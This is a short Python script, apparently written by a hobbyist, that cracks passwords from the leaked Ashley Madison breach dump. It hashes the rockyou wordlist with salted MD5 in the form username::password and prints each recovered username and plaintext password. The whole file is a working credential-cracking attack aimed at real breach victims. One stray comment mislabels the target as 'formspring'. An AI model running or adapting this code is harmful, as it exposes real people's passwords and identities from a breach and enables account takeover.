import hashlib
import platform


def dictionary_attack():

    # test - apparently I was using a 32-bit python distro >_>;
    print(platform.architecture())

    # start by defining an empty list of hashes
    hashes = []

    # we will also need a collection of users for the salt
    users = []

    # load the Ashley Madison hash file and add each hash to the empty list defined above
    # we need to parse the user names and hashes separately as we will need the usernames later for salt
    with open('resources/AM2M.dump', 'r') as ashley_madison_file:
        for line in ashley_madison_file:
            hashes.append(line.replace("\n", "").split(",")[3][1:-1])
            users.append(line.replace("\n", "").split(",")[1][1:-1])

    # now define an empty set of passwords
    passwords = set()

    # load the password dictionary and add each password to the set
    # borrowed from http://github.com/brannondorsey/naive-hashcat
    with open('resources/rockyou.txt', 'r') as password_dictionary:
        for line in password_dictionary:
            passwords.add(line.replace("\n", ""))

    # let the cracking begin!
    # this will be our cracked password counter
    cracked = 0

    # iterate over the password set applying the salt, hashing, then comparing to the formspring hash list
    for user in users:
        for password in passwords:
            # notice that the salt here is a username + :: + password
            salted = (user + '::' + password)
            # I'm also using a different hashing algorithm here: MD5
            # bcrypt would be too difficult to get back into plaintext, so I'm ignoring it
            digest = hashlib.md5(salted.encode('utf-8')).hexdigest()
            if digest in hashes:
                cracked += 1
                print('password detected! user: ' + user + ' password: ' + password)

    # print the total
    print('total passwords cracked: ' + str(cracked))

    return


if __name__ == '__main__':
    """ this is our main driver method for the Ashley Madison dictionary attack """
    dictionary_attack()